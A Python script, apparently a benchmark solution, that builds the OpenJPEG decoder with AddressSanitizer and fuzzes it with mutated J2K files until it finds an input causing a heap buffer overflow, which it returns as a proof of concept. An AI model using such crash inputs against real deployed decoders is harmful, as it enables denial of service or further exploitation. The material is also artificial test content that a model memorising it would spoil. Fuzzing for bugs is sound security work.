import os
import tarfile
import subprocess
import tempfile
import glob
import random
import time
import struct
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Strategy:
        1. Extract the source code from the provided tarball.
        2. Compile the OpenJPEG codec with AddressSanitizer (ASAN) enabled.
        3. Collect seed J2K files from the source tree or generate a minimal valid base.
        4. Fuzz the compiled `opj_decompress` binary with mutated seeds.
        5. Detect a Heap Buffer Overflow via ASAN output and return the triggering input.
        """
        # Create a temporary working directory
        with tempfile.TemporaryDirectory() as work_dir:
            # 1. Extract source code
            try:
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=work_dir)
            except Exception:
                # If extraction fails, we can't proceed with fuzzing.
                # Return a minimal valid J2K as a fallback heuristic.
                return self.make_base_j2k()

            # Locate source root (handle nested directories)
            src_root = work_dir
            entries = [e for e in os.listdir(work_dir) if not e.startswith('.')]
            if len(entries) == 1 and os.path.isdir(os.path.join(work_dir, entries[0])):
                src_root = os.path.join(work_dir, entries[0])

            # 2. Build OpenJPEG with ASAN
            build_dir = os.path.join(src_root, "build_fuzz")
            os.makedirs(build_dir, exist_ok=True)
            
            # CMake configuration with ASAN
            san_flags = "-fsanitize=address -g"
            cmake_cmd = [
                "cmake", "..",
                "-DCMAKE_BUILD_TYPE=Debug",
                f"-DCMAKE_C_FLAGS={san_flags}",
                f"-DCMAKE_CXX_FLAGS={san_flags}",
                "-DBUILD_SHARED_LIBS=OFF",
                "-DBUILD_CODEC=ON",
                "-DBUILD_PKGCONFIG_FILES=OFF",
                "-DBUILD_JPIP=OFF",
                "-DBUILD_JPWL=OFF",
                "-DBUILD_MJ2=OFF"
            ]
            
            # Run CMake
            subprocess.run(
                cmake_cmd, 
                cwd=build_dir, 
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.DEVNULL
            )
            
            # Run Make (use 8 cores)
            subprocess.run(
                ["make", "-j8", "opj_decompress"], 
                cwd=build_dir, 
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.DEVNULL
            )
            
            # Locate the executable
            exe_path = os.path.join(build_dir, "bin", "opj_decompress")
            if not os.path.exists(exe_path):
                # Fallback search
                found = glob.glob(os.path.join(build_dir, "**", "opj_decompress"), recursive=True)
                if found:
                    exe_path = found[0]
                else:
                    return self.make_base_j2k()

            # 3. Gather Seeds
            seeds = []
            for root, dirs, files in os.walk(src_root):
                for f in files:
                    if f.lower().endswith(('.j2k', '.jp2', '.j2c')):
                        try:
                            with open(os.path.join(root, f), "rb") as fd:
                                content = fd.read()
                                # Filter very large files to speed up fuzzing
                                if 0 < len(content) < 50000:
                                    seeds.append(content)
                        except:
                            pass
            
            # If no seeds found, use a minimal valid J2K
            if not seeds:
                seeds.append(self.make_base_j2k())

            # 4. Fuzzing Loop
            # We aim to trigger a crash within a reasonable time budget (~45s)
            start_time = time.time()
            # If we don't find a crash, return the simplest seed (heuristic)
            best_poc = seeds[0] 
            
            idx = 0
            while time.time() - start_time < 45:
                idx += 1
                seed = random.choice(seeds)
                mutated_data = self.mutate(seed)
                
                # Write mutation to file
                test_path = os.path.join(work_dir, f"fuzz_{idx}.j2k")
                with open(test_path, "wb") as f:
                    f.write(mutated_data)
                
                # Run the decoder
                # -i input -o output (required by some versions)
                cmd = [exe_path, "-i", test_path, "-o", os.path.join(work_dir, "out.bmp")]
                
                try:
                    proc = subprocess.run(
                        cmd,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.PIPE,
                        timeout=0.5
                    )
                    
                    # Check for ASAN violation
                    if proc.returncode != 0:
                        stderr_output = proc.stderr.decode(errors='ignore')
                        # We are specifically looking for memory errors
                        if "AddressSanitizer" in stderr_output and ("heap-buffer-overflow" in stderr_output or "malloc-size" in stderr_output):
                            return mutated_data
                        
                except subprocess.TimeoutExpired:
                    pass
                except Exception:
                    pass
                
                # Periodic cleanup to save inode space
                if idx % 50 == 0:
                    try:
                        os.remove(test_path)
                    except:
                        pass

            return best_poc

    def mutate(self, data: bytes) -> bytes:
        """Apply random mutations to the byte data."""
        arr = bytearray(data)
        if not arr:
            return data
            
        method = random.random()
        
        if method < 0.1:
            # Append garbage (buffer over-read/flow triggers)
            arr.extend(os.urandom(random.randint(1, 64)))
            
        elif method < 0.5:
            # Bit flips
            num_flips = random.randint(1, 5)
            for _ in range(num_flips):
                idx = random.randint(0, len(arr) - 1)
                bit = random.randint(0, 7)
                arr[idx] ^= (1 << bit)
                
        elif method < 0.8:
            # Byte overwrites
            interesting_vals = [0x00, 0xFF, 0x7F, 0x80, 0x40, 0x01]
            num_writes = random.randint(1, 3)
            for _ in range(num_writes):
                idx = random.randint(0, len(arr) - 1)
                arr[idx] = random.choice(interesting_vals)
                
        else:
            # 16-bit word overwrites (targeting size fields)
            if len(arr) > 2:
                idx = random.randint(0, len(arr) - 2)
                # Interesting 16-bit integers
                val = random.choice([0xFFFF, 0x0000, 0xFFFE, 0x8000, 0x7FFF, 1024, 4096])
                struct.pack_into(">H", arr, idx, val)
                
        return bytes(arr)

    def make_base_j2k(self) -> bytes:
        """
        Construct a minimal valid J2K file.
        Contains SOC, SIZ, COD, QCD, SOT, SOD, data, EOC.
        """
        # SOC
        soc = b'\xff\x4f'
        # SIZ (Image and Tile Size): 128x128 image, 1 component
        siz = b'\xff\x51\x00\x29\x00\x00\x00\x00\x00\x80\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x07\x01\x01'
        # COD (Coding Style): Default style
        cod = b'\xff\x52\x00\x0c\x00\x00\x00\x01\x00\x01\x04\x04\x00\x00'
        # QCD (Quantization Default): No quantization
        qcd = b'\xff\x5c\x00\x05\x00\x00'
        # SOT (Start of Tile)
        sot = b'\xff\x90\x00\x0a\x00\x00\x00\x00\x00\x01'
        # SOD (Start of Data)
        sod = b'\xff\x93'
        # Dummy compressed data
        data = b'\x00' * 32
        # EOC (End of Codestream)
        eoc = b'\xff\xd9'
        
        return soc + siz + cod + qcd + sot + sod + data + eoc